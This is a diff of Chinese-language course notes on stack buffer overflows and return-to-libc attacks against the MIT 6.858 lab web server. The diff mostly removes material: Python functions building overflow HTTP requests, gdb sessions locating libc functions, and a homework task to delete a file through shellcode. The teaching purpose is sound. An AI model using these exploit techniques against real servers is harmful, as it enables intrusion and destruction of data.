-    req =   "GET /" + urllib.quote(shellcode) + \
-             'A' * (1024-len("/home/httpd/lab/")-len(shellcode)) + \
-            struct.pack("<I", stack_buffer + len("/home/httpd/lab/")) + \
-            " HTTP/1.0\r\n" + \
-            "\r\n"
-    return req
-
-```
-运行脚本`./exploit-3.py localhost 8080`，并在启动web服务的中断查看shell是否被启动。
+- 用`exec()`替代`fork()`，由于`fork()`拷贝父进程地址空间
+- Windows不怕BROP，因为Windows里没有类似`fork()`的调用
 
 ---
 
-## Return-to-libc攻击
 
-参考资料：[Bypassing non-executable-stack during exploitation using return-to-libc](http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf)
-
-大多数操作系统为了防御缓冲区溢出攻击，不允许栈中内容执行，在栈中注入shellcode的方法就失效了。一种可以绕过不可执行栈的方法是**return-to-libc**攻击。该攻击将控制流引向标准库libc中函数，而不需要向栈中注入代码。攻击分为3步：
-
-1. 查找欲利用的在标准库libc中函数的位置，例如`execl`，`system`，或`unlink`
-1. 改写返回地址为libc函数地址，在栈中布置函数参数，构造一个libc函数的调用环境
-1. 待有漏洞函数返回时，根据返回地址调转到libc函数
-
-启动不可执行栈服务：
-
-```
-$ ./clean-env.sh ./zookld zook-nxstack.conf
-```
-
-首先，用`gdb`查找libc中函数`system()`地址。
-
-``` sh
-$ gdb -q -p $(pgrep zookfs)
-(gdb) p system
-$1 = {<text variable, no debug info>} 0x40065100 <__libc_system>
-(gdb) p exit
-$2 = {<text variable, no debug info>} 0x40058150 <__GI_exit>
-``` 
-
-得到了`system()`地址为`0x40065100`。但其中最后一个字节的`0x00`导致其不能在字符串中出现。因此，在本漏洞中无法直接使用，下一节课我们会学习这意味着什么。
-
-下面用`exit(16843009)`(`16843009`=`0x01010101`)来演示，函数地址`0x40058150`。
-
-为了令`http_serve()`正常执行后返回，不能改写`handler`。记录`handler`初始值备用。
-
-``` sh
-(gdb) p handler
-$2 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
-```
-
-
-[](为了执行`system("/bin/sh")`，还需要一个`"/bin/sh"`字符串。有些情况下，该字符串在环境变量`SHELL`的值中，而环境变量在启动进程时已经被作为参数压入栈底，可用`gdb`在栈中搜索，例如`x/1000s $esp`。本例中未载入该环境变量，需在缓冲区中添加。)
-
-
-然后，在栈中布置参数为调用做准备。当漏洞函数返回时，根据返回地址跳转到libc函数，libc函数从栈中读取参数。
-
-```  
-     stack bottom                           
-+———————————————————————————————————————————————————————+ (0x01010101)  
-|       name         |<——— (+12) |      argument        | (16843009)
-+————————————————————+           +——————————————————————+   
-|      fd = 3        |<——— (+8)  |    return address    | (ABCD)
-+————————————————————+           +——————————————————————+
-|   return address   |<——— (+4)  |    exit() address    | (0x40058150)
-+————————————————————+           +——————————————————————+
-|        ebp         |<——— (0)   |                      |<——0xbfffde08
-+————————————————————+           |                      |
-|                    |           |                      |
-+————————————————————+           +——————————————————————+
-|  void (*handler)   |  ^        |     unchanged        | (0x80495ea)
-+————————————————————+  |        +——————————————————————+         
-|pn[1023]   ^        |  |        |                      |   
-|           |        |  |        |                      |   
-|           |        |  | name[0]|                      |
-|           |        +———————————+——————————————————————+
-|           |   pn[0]|   getwd   |  "/home/httpd/lab/"  |
-+———————————————————————————————————————————————————————+<——0xbfffd9fc
-
-```
-
-构造HTTP请求：
-
-``` python
-def build_exploit(shellcode):
-
-    handler = 0x80495ea
-    exit_addr = 0x40058150
-    exit_status = 0x01010101
-
-    req =   "GET /" + \
-            'A' * (1024-len("/home/httpd/lab/")) + \
-            struct.pack("<I",handler) + \
-            'A' * 12 + \
-            struct.pack("<I",exit_addr) + \
-            "ABCD" + \
-            struct.pack("<I",exit_status) + \
-            " HTTP/1.0\r\n" + \
-            "\r\n"
-    return req
-
-```
-
-用`gdb`调试来演示攻击过程与结果：
-
-``` gas
-$ gdb -p $(pgrep zookfs)
-(gdb) b http_serve
-Breakpoint 1 at 0x804951c: file http.c, line 275.
-(gdb) c
-Continuing.
-
-[发送请求: ./exploit-4sh.py localhost 8080]
-
-[New process 9883]
-[Switching to process 9883]
-
-Breakpoint 1, http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:275
-warning: Source file is more recent than executable.
-275         void (*handler)(int, const char *) = http_serve_none;
-(gdb) n
-279         getcwd(pn, sizeof(pn));
-(gdb)
-280         setenv("DOCUMENT_ROOT", pn, 1);
-(gdb)
-282         strcat(pn, name);
-(gdb)
-283         split_path(pn);
-(gdb) x/10s pn        [查看buffer]
-0xbfffd9fc:     "/home/httpd/lab/", 'A' <repeats 184 times>...
-0xbfffdac4:     'A' <repeats 200 times>...
-0xbfffdb8c:     'A' <repeats 200 times>...
-0xbfffdc54:     'A' <repeats 200 times>...
-0xbfffdd1c:     'A' <repeats 200 times>...
-0xbfffdde4:     'A' <repeats 24 times>, "\352\225\004\b", 'A' <repeats 12 times>, "P\201\005@ABCD\001\001\001\001"
-0xbfffde19:     " "
-0xbfffde1b:     ""
-0xbfffde1c:     ",\376\377\277"
-0xbfffde21:     ""
-(gdb) p handler       [查看handler是否被改写]
-$1 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
-(gdb) x/wx $ebp+4     [查看返回地址，已经被改为exit()地址]
-0xbfffde0c:     0x40058150
-(gdb) x $ebp+12       [查看exit()参数，表明攻击成功]
-0xbfffde14:     0x01010101
-(gdb) n
-285         if (!stat(pn, &st))
-(gdb)
-296         handler(fd, pn);
-(gdb)
-297     }
-(gdb)                 [继续执行到exit]
-__GI_exit (status=16843009) at exit.c:103
-103     exit.c: No such file or directory.
-(gdb)
-104     in exit.c
-(gdb)
-[Inferior 2 (process 9883) exited with code 01]
-```
-
----
-
-##作业：删除敏感文件
-
-实验资料：[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。
-
-####1. 可执行栈上shellcode攻击
-
-利用缓冲区溢出漏洞将shellcode注入到web服务器，删除一个敏感文件`/home/httpd/grades.txt`。主要任务是构造一个新的shellcode。
-
-**提示：**删除文件系统调用`SYS_unlink`调用号是`10`或`'\n'`(newline)。若`'\n'`直接出现在HTTP请求URL中，则会被截断，因此需要特殊处理。
-
-实验会用到下列命令：
-
-- 创建新文件：`touch /home/httpd/grades.txt`
-- 编译：`gcc -m32 -c -o shellcode.bin shellcode.S`
-- 提取二进制指令：`objcopy -S -O binary -j .text shellcode.bin`
-- 执行二进制指令：`./run-shellcode shellcode.bin`
-
-将攻击程序命名为`exploit-3.py`，用`make check-exstack`来检查攻击是否成功。
-
-####2. 不可执行栈上return-to-libc攻击
-
-在栈不可执行的web服务器上，采用return-to-libc攻击删除敏感文件`/home/httpd/grades.txt`。
-
-将攻击程序命名为`exploit-4a.py`和`exploit-4b.py`，用`make check-libc`来检查攻击是否成功。
-
-**提示：**libc中`unlink()`函数参数是一个指向以`'\0'`结尾字符串的指针。因此，需在栈中注入字符串，并保证在漏洞触发时，该字符串结尾为`'\0'`。
 
 
 
